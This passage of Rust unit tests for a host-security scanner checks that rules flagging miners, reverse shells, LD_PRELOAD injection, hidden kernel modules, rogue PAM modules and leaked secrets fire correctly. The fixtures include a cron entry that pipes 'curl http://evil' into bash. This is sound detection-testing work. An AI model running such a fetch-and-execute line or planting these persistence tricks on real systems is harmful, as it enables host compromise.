        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 1337,
            name: "xmrig".into(),
            exe_path: Some("/tmp/xmrig".into()),
            ..Default::default()
        }];
        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(cf.compromised_host, "SEC-016 must set compromised_host");
        assert!(cf.is_compromised());

        let mut r = minimal_report();
        r.network.firewall_active = false;
        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(cf.has_critical(), "SEC-001 is a standard critical");
        assert!(
            !cf.compromised_host,
            "hygiene critical must not set compromise"
        );

        use crate::models::{CronJob, CronSeverity};
        let mut r = minimal_report();
        r.host.cron_jobs = vec![CronJob {
            command: "* * * * * root curl http://evil | bash -c".into(),
            severity: CronSeverity::Critical,
        }];
        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(findings.iter().any(|f| f.id == "SEC-018"), "SEC-018 fires");
        assert!(
            !cf.compromised_host,
            "cron persistence is not an active compromise"
        );
    }

    #[test]
    fn sec020_mimic_sets_compromised_host() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 100,
            name: "kworker/0:1".into(),
            exe_path: Some("/tmp/kdevtmpfsi".into()),
            is_mimic: true,
            ..Default::default()
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-020")
            .expect("SEC-020 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("kworker/0:1") && f.evidence.contains("/tmp/kdevtmpfsi"));

        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(cf.compromised_host, "mimic must set compromise");
    }

    #[test]
    fn sec021_mount_masking_sets_compromised_host() {
        use crate::models::MountMaskingFinding;
        let mut r = minimal_report();
        r.security.mount_masking = vec![MountMaskingFinding {
            target_path: "/proc/1337".into(),
            mount_source: "tmpfs".into(),
            fstype: "tmpfs".into(),
            reason: "overlay hides a PID from /proc (process masking)".into(),
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-021")
            .expect("SEC-021 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("/proc/1337"));

        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(cf.compromised_host, "mount masking must set compromise");
    }

    #[test]
    fn sec022_reverse_shell_sets_compromised_host() {
        use crate::models::ReverseShellFinding;
        let mut r = minimal_report();
        r.security.reverse_shells = vec![ReverseShellFinding {
            pid: 4444,
            process: "bash".into(),
            exe_path: Some("/usr/bin/bash".into()),
            remote_address: "203.0.113.5:443".into(),
            stdio_fd: Some(1),
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-022")
            .expect("SEC-022 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("203.0.113.5:443"));
        assert!(f.evidence.contains("stdout"));

        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(cf.compromised_host, "reverse shell must set compromise");
    }

    #[test]
    fn sec023_library_injection_sets_compromised_host() {
        use crate::models::LibraryInjectionFinding;
        let mut r = minimal_report();
        r.security.library_injections = vec![LibraryInjectionFinding {
            pid: 2222,
            process: "sshd".into(),
            object_path: "/tmp/hide.so".into(),
            source: "LD_PRELOAD".into(),
            is_deleted: false,
            region_addr: None,
            deep_forensics: None,
            exe_path: None,
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-023")
            .expect("SEC-023 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("/tmp/hide.so"));
        assert!(f.evidence.contains("LD_PRELOAD"));

        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(cf.compromised_host, "library injection must set compromise");
    }

    #[test]
    fn sec024_confirmed_ghost_sets_compromised_host() {
        use crate::models::GhostPidFinding;
        let mut r = minimal_report();
        r.security.ghost_pids = vec![GhostPidFinding {
            pid: 31337,
            state: Some("R".into()),
            age_secs: Some(3600),
            confirmed_via: "stat-path+kill".into(),
            confirmed_ioc: true,
            holds_socket: true,
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-024")
            .expect("SEC-024 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("31337"));
        assert!(f.evidence.contains("holds socket"));

        let findings = evaluate(&r);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(
            cf.compromised_host,
            "confirmed ghost PID must set compromise"
        );
    }

    #[test]
    fn sec025_downgraded_ghost_does_not_set_compromise() {
        use crate::models::GhostPidFinding;
        let mut r = minimal_report();
        r.security.ghost_pids = vec![GhostPidFinding {
            pid: 4242,
            state: Some("R".into()),
            age_secs: Some(1),
            confirmed_via: "stat-path".into(),
            confirmed_ioc: false,
            holds_socket: false,
        }];
        let findings = evaluate(&r);
        assert!(
            findings.iter().any(|f| f.id == "SEC-025"),
            "SEC-025 downgraded finding fires"
        );
        assert!(
            !findings.iter().any(|f| f.id == "SEC-024"),
            "no hard SEC-024 for a young candidate"
        );
        let cf = CriticalFlags::from_findings(&findings);
        assert!(
            !cf.compromised_host,
            "downgraded ghost must not set compromise"
        );
    }

    #[test]
    fn sudo_marker_triggers_all_weight() {
        let mut r = minimal_report();
        r.security.sudo_nopasswd_entries = vec![format!(
            "/etc/sudoers: drobot ALL=(ALL) NOPASSWD: /tmp/owlzops-mapper  {} /tmp/owlzops-mapper is replaceable ...]",
            crate::models::SUDO_PRIVESC_MARKER
        )];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-005")
            .expect("SEC-005 fires");
        assert_eq!(
            f.weight, 15,
            "PRIVESC-marker entry must be treated as NOPASSWD: ALL"
        );
    }

    #[test]
    fn known_binary_with_inheritable_flag_is_not_flagged() {
        let fc = FileCapFinding {
            path: "/usr/bin/dumpcap".into(),
            capabilities: vec![
                "CAP_NET_ADMIN".into(),
                "CAP_NET_RAW".into(),
                "CAP_NET_ADMIN(inh)".into(),
                "CAP_NET_RAW(inh)".into(),
            ],
            package: None,
            ..Default::default()
        };
        assert_eq!(
            classify_cap_binary(&fc, &ProvenanceSource::Unavailable).0,
            0
        );
    }

    #[test]
    fn inheritable_only_escalation_still_fires() {
        let fc = FileCapFinding {
            path: "/usr/bin/ping".into(),
            capabilities: vec!["CAP_SYS_ADMIN(inh)".into()],
            package: None,
            ..Default::default()
        };
        assert_eq!(
            classify_cap_binary(&fc, &ProvenanceSource::Unavailable).0,
            8
        );
    }

    #[test]
    fn ephemeral_port_with_ambient_only_does_not_fire_sec015() {
        use crate::models::{CapReason, PortInfo, ProcCapFinding};
        let mut r = minimal_report();
        r.network.listening_ports = vec![PortInfo {
            protocol: "tcp".into(),
            port: "4444".into(),
            process: "x".into(),
            bind_address: "0.0.0.0".into(),
            pid: Some(1337),
            exe_path: Some("/tmp/x".into()),
        }];
        r.security.capability_audit = vec![ProcCapFinding {
            pid: 1337,
            comm: "x".into(),
            euid: 1000,
            effective: 0x400,
            permitted: 0x400,
            inheritable: 0x400,
            bounding: 0x1ff_ffff_ffff,
            ambient: 0x400,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: vec![],
            reason: Some(CapReason::AmbientCapsNoNewPrivs),
        }];
        let ids: Vec<_> = evaluate(&r).into_iter().map(|f| f.id).collect();
        assert!(
            !ids.iter().any(|id| *id == "SEC-015" || *id == "SEC-017"),
            "ambient-only entry must not complete the ephemeral-exec capability correlation"
        );
        assert!(ids.contains(&"CAP-002"));
    }

    #[test]
    fn ambient_weight_tiers() {
        assert_eq!(ambient_escalation_weight(1 << 14), 0);
        assert_eq!(ambient_escalation_weight(1 << 25), 0);
        assert_eq!(ambient_escalation_weight(1 << 10), 0);
        assert_eq!(ambient_escalation_weight(1 << 13), 5);
        assert_eq!(ambient_escalation_weight(1 << 21), 12);
        assert_eq!(ambient_escalation_weight(1 << 19), 12);
        assert_eq!(ambient_escalation_weight((1 << 14) | (1 << 21)), 12);
        assert_eq!(ambient_escalation_weight(1 << 40), 12);
    }

    #[test]
    fn cap002_ipc_lock_is_informational() {
        let mut r = minimal_report();
        r.security.capability_audit = vec![ProcCapFinding {
            pid: 1013,
            comm: "mariadbd".into(),
            euid: 108,
            effective: 1 << 14,
            permitted: 1 << 14,
            inheritable: 0,
            bounding: 0x1ff_ffff_ffff,
            ambient: 1 << 14,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: vec![],
            reason: Some(CapReason::AmbientCapsNoNewPrivs),
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-002")
            .expect("CAP-002 present");
        assert_eq!(f.weight, 0, "IPC_LOCK ambient must be informational");
        assert!(f.suppressed.is_some());
    }

    #[test]
    fn cap002_sys_admin_keeps_weight() {
        let mut r = minimal_report();
        r.security.capability_audit = vec![ProcCapFinding {
            pid: 4242,
            comm: "evil".into(),
            euid: 1000,
            effective: 1 << 21,
            permitted: 1 << 21,
            inheritable: 0,
            bounding: 0x1ff_ffff_ffff,
            ambient: 1 << 21,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: vec![],
            reason: Some(CapReason::AmbientCapsNoNewPrivs),
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-002" && f.suppressed.is_none())
            .expect("weighted CAP-002");
        assert_eq!(f.weight, 12);
    }

    #[test]
    fn sec038_nvidia_unsigned_is_informational() {
        let mut r = minimal_report();
        r.security.kernel_taint = KernelTaint {
            raw: 12288,
            flags: vec![
                TaintFlag {
                    bit: 12,
                    code: 'O',
                    name: "out-of-tree module loaded".into(),
                    security_relevant: false,
                },
                TaintFlag {
                    bit: 13,
                    code: 'E',
                    name: "unsigned module loaded".into(),
                    security_relevant: true,
                },
            ],
            unavailable: false,
        };
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-038")
            .expect("SEC-038 present");
        assert_eq!(f.weight, 0, "unsigned/OOT alone must be informational");
        assert!(f.suppressed.is_some());
    }

    #[test]
    fn sec038_unsigned_plus_hidden_module_escalates() {
        let mut r = minimal_report();
        r.security.kernel_taint = KernelTaint {
            raw: 1 << 13,
            flags: vec![TaintFlag {
                bit: 13,
                code: 'E',
                name: "unsigned module loaded".into(),
                security_relevant: true,
            }],
            unavailable: false,
        };
        r.security.kernel_modules = KernelModuleInventory {
            proc_modules: vec!["ext4".into()],
            sysfs_modules: vec!["ext4".into(), "diamorphine".into()],
            hidden_candidates: vec![HiddenModule {
                name: "diamorphine".into(),
                seen_in: vec!["sysfs".into()],
            }],
            kallsyms_checked: true,
        };
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-038" && f.suppressed.is_none())
            .expect("weighted SEC-038");
        assert_eq!(f.weight, 25);
        assert!(f.evidence.contains("SEC-040"));
    }

    #[test]
    fn sec039_complain_informational_permissive_weighted() {
        let mut r = minimal_report();
        r.security.confinement = ConfinementReport {
            lsms: vec!["apparmor".into()],
            selinux_permissive: false,
            complain_profiles: vec![ComplainProc {
                pid: 2655657,
                comm: "named".into(),
                profile: "named".into(),
            }],
            attr_read_incomplete: false,
        };
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-039")
            .expect("SEC-039 present");
        assert_eq!(f.weight, 0, "point-in-time complain must be informational");

        let mut r2 = minimal_report();
        r2.security.confinement = ConfinementReport {
            lsms: vec!["selinux".into()],
            selinux_permissive: true,
            complain_profiles: vec![],
            attr_read_incomplete: false,
        };
        let f2 = evaluate(&r2)
            .into_iter()
            .find(|f| f.id == "SEC-039" && f.suppressed.is_none())
            .expect("weighted SEC-039");
        assert_eq!(f2.weight, 15);
    }

    #[test]
    fn unit_is_vendor_shipped_by_directory() {
        use super::unit_is_vendor_shipped;

        let f = ExecStartFinding {
            unit_path: "/usr/lib/systemd/system/lxd-agent.service".into(),
            unit_package: None,
            ..Default::default()
        };
        assert!(unit_is_vendor_shipped(&f));

        let d = ExecStartFinding {
            unit_path: "/etc/systemd/system/update.service".into(),
            unit_package: None,
            ..Default::default()
        };
        assert!(!unit_is_vendor_shipped(&d));
    }

    #[test]
    fn sec049_unverifiable_preload_does_not_set_compromise() {
        let mut r = minimal_report();
        r.security.provenance_source = ProvenanceSource::Unavailable;
        r.security.preload_injections = vec![PreloadFinding {
            path: "/usr/lib/libsnoopy.so".into(),
            volatile: false,
            package: None,
            mapped_by_pids: None,
        }];
        let findings = evaluate(&r);
        assert!(findings.iter().any(|f| f.id == "SEC-049"));
        assert!(
            !CriticalFlags::from_findings(&findings).compromised_host,
            "unverifiable ownership != active compromise"
        );
    }

    #[test]
    fn every_ioc_branch_carries_ioc_weight() {
        let mut r = minimal_report();
        r.security.preload_injections = vec![PreloadFinding {
            path: "/dev/shm/eb.so".into(),
            volatile: true,
            package: None,
            mapped_by_pids: Some(3),
        }];
        r.security.exec_start_injections = vec![ExecStartFinding {
            unit_path: "/etc/systemd/system/x.service".into(),
            exec_path: "/dev/shm/x".into(),
            volatile: true,
            writability: ExecWritability::RootOnly,
            runs_as_root: true,
            ..Default::default()
        }];

        for f in evaluate(&r).iter().filter(|f| f.suppressed.is_none()) {
            if ["SEC-042", "SEC-043"].contains(&f.id) {
                assert!(f.weight >= 55, "{} emitted with weight {}", f.id, f.weight);
            }
        }
    }

    #[test]
    fn failed_scanner_suppresses_derived_findings() {
        let mut r = minimal_report();
        r.network.firewall_active = false;
        r.network.ssl_certificates = vec![SslCertInfo {
            domain: "example.com".into(),
            expiry_date: "2025-01-01".into(),
            days_remaining: Some(1),
            is_critical: true,
            is_warning: false,
        }];
        r.failed_scanners = vec!["network".to_string()];

        let findings = evaluate(&r);
        assert!(!findings.iter().any(|f| f.id == "SEC-001"));
        assert!(!findings.iter().any(|f| f.id == "SEC-004"));
    }

    #[test]
    fn failed_scanner_does_not_hide_independent_findings() {
        let mut r = minimal_report();
        r.packages.upgradable.push(UpgradablePackage {
            name: "libc".into(),
            current_version: "1.0".into(),
            new_version: "1.1".into(),
            is_security: true,
        });
        r.failed_scanners = vec!["security".to_string()];

        let findings = evaluate(&r);
        assert!(findings.iter().any(|f| f.id == "SEC-003"));
        assert!(!findings.iter().any(|f| f.id == "SEC-002"));
    }

    #[test]
    fn a_failed_scanner_does_not_change_the_security_verdict() {
        let mut r = minimal_report();
        r.network.firewall_active = true;
        r.security.ssh_root_login_enabled = false;
        r.host.backup_tools = vec!["restic".to_string()];
        r.host.ntp_synchronized = true;
        r.failed_scanners = vec!["security".to_string()];

        let findings = evaluate(&r);
        let verdict = security_verdict_from_findings(&findings);

        assert_eq!(verdict, SecurityVerdict::Clean);
        assert!(findings.iter().any(|f| f.id == "COV-001"));
    }

    #[test]
    fn known_ioc_from_healthy_scanner_dominates_incomplete() {
        use crate::models::SuspiciousProcess;

        let mut r = minimal_report();
        r.failed_scanners = vec!["docker".to_string()];
        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 1337,
            name: "xmrig".into(),
            exe_path: Some("/tmp/xmrig".into()),
            ..Default::default()
        }];

        let findings = evaluate(&r);
        let verdict = security_verdict_from_findings(&findings);

        assert_eq!(verdict, SecurityVerdict::Compromised);
    }

    #[test]
    fn pam_findings_belong_to_persistence_scanner() {
        let mut r = minimal_report();
        r.security.pam_injections = vec![PamFinding {
            services: vec!["sshd".into()],
            module: PamModule {
                module_path: "/tmp/pam_evil.so".into(),
            },
            writability: ExecWritability::NonRootWritable,
            volatile: false,
            package: None,
            uid: None,
            gid: None,
            parent_takeable: false,
            target_kind: PamTargetKind::Module,
            declared_as: None,
        }];

        let findings = evaluate(&r);
        for f in findings.iter().filter(|f| f.id == "SEC-055") {
            assert_eq!(f.source, Scanner::Persistence);
        }
    }

    #[test]
    fn a_critical_survives_the_failed_scanner_filter() {
        let mut r = minimal_report();
        r.network.firewall_active = false; // SEC-001, network is healthy
        r.failed_scanners = vec!["security".to_string()];

        let findings = evaluate(&r);
        assert_eq!(
            security_verdict_from_findings(&findings),
            SecurityVerdict::Critical
        );
        assert!(findings.iter().any(|f| f.id == "COV-001"));
        assert!(
            findings.iter().any(|f| f.id == "SEC-001"),
            "the critical is still reported"
        );
    }

    #[test]
    fn every_runner_scanner_name_maps_to_a_variant() {
        for name in [
            "host",
            "databases",
            "network",
            "storage",
            "security",
            "packages",
            "docker",
            "persistence",
        ] {
            assert!(
                Scanner::from_name(name).is_some(),
                "`{name}` has no Scanner variant"
            );
        }
    }

    #[test]
    fn sec014_ignores_self_attributed_leaks() {
        let mut r = minimal_report();
        r.security.secret_hygiene = vec![SecretLeak {
            pid: std::process::id(),
            process: "owlzops-mapper".into(),
            source: "environ".into(),
            matched_key: "VAULT_TOKEN".into(),
            self_attributed: Some("own process".into()),
        }];
        let f = evaluate(&r);
        assert!(
            !f.iter().any(|f| f.id == "SEC-014"),
            "the host must not be charged for the scanner's own environment"
        );
        let own = f.iter().find(|f| f.id == "SEC-058").expect("SEC-058 fires");
        assert_eq!(own.weight, 0, "informational, never weighted");
        assert!(
            own.evidence.contains("VAULT_TOKEN"),
            "Raw Truth: never dropped"
        );
    }

    #[test]
    fn sec014_counts_only_host_leaks_when_mixed() {
        let mut r = minimal_report();
        let mk = |pid, key: &str, own: bool| SecretLeak {
            pid,
            process: "p".into(),
            source: "environ".into(),
            matched_key: key.into(),
            self_attributed: own.then(|| "own process".to_string()),
        };
        r.security.secret_hygiene = vec![
            mk(std::process::id(), "VAULT_TOKEN", true),
            mk(4242, "PGPASSWORD", false),
        ];
        let f = evaluate(&r);
        let sec014 = f.iter().find(|f| f.id == "SEC-014").expect("fires");
        assert!(
            sec014.evidence.contains("Found 1 leak"),
            "self leak must not be counted"
        );
        assert!(sec014.evidence.contains("PGPASSWORD"));
        assert!(!sec014.evidence.contains("VAULT_TOKEN"));
    }
}
